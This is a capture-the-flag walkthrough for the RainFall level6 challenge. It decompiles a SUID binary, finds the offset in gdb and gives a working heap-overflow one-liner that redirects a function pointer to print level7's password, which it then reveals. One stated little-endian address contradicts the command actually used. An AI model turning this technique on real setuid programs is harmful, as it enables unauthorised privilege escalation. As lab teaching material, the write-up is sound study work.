
We get in the level6, then we list the files in the home directory:

```
    level6@RainFall:~$ ls -la
    -rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6

```
The binary is owned by level7 and has the SUID bit set, meaning if it executes any shell, it will run with level7's privileges.

We try to execute the binary file to get an idea of what it does exactly
```
    level6@RainFall:~$ ./level6 dsds
    Nope
    level6@RainFall:~$ ./level6 dsds sadas
    Nope
    level6@RainFall:~$ ./level6 dsdsdasjdasjhgdhjasgdjhasgdhsgdjhasgdjhasgdjhasagdhjsagdhasgdjashgdhsjgdjhsgdhsagdjhasgdjhasgdjhasgdjhasgdjhasgdaw
    Segmentation fault (core dumped)
    level6@RainFall:~$ 
```

We decompile the binary to get the source code:

```
    int n()
    {
        return system("/bin/cat /home/user/level7/.pass");
    }

    int m()
    {
        return puts("Nope");
    }

    int main(int argc, char** argv, char** envp) 
    {
        char* user_input = malloc(64);

        int (**function_ptr)() = malloc(sizeof(void*));

        *function_ptr = m;

        strcpy(user_input, argv[1]);

        return (*function_ptr)();
    }
```

The program allocates two things on the heap: a 64 byte input buffer and a 4 byte function pointer.

The function pointer point to a function m() that print "Nope".

If we overflow the input buffer we can overwrite the function pointer with the address of function n() that print the flag.

```
    (gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

    Program received signal SIGSEGV, Segmentation fault.
    0x41346341 in ?? ()
    (gdb) 

```
the offset is 72

- the address of n()

```
    (gdb) info functions
    All defined functions:

    Non-debugging symbols:
    0x080482f4  _init
    0x08048340  strcpy
    0x08048340  strcpy@plt
    0x08048350  malloc
    0x08048350  malloc@plt
    0x08048360  puts
    0x08048360  puts@plt
    0x08048370  system
    0x08048370  system@plt
    0x08048380  __gmon_start__
    0x08048380  __gmon_start__@plt
    0x08048390  __libc_start_main
    0x08048390  __libc_start_main@plt
    0x080483a0  _start
    0x080483d0  __do_global_dtors_aux
    0x08048430  frame_dummy
    0x08048454  n
    0x08048468  m
    0x0804847c  main
    0x080484e0  __libc_csu_init
    0x08048550  __libc_csu_fini
    0x08048552  __i686.get_pc_thunk.bx
    0x08048560  __do_global_ctors_aux
    0x0804858c  _fini
    (gdb) 
```

the address of function n() is => 0x08048454  in little-indian \x54\x84\x08\x00

- we gonna do Heap-based Buffer Overflow

we need to overflow more than just 64 bytes to reach function_ptr.

64 bytes for user_input + 8 bytes of malloc metadata for the next chunk = 72

then the function pointer is there.

```
    level6@RainFall:~$ ./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')
    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

We jump to next level

```
level6@RainFall:~$ su level7
Password:f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
level7@RainFall:~$ 
```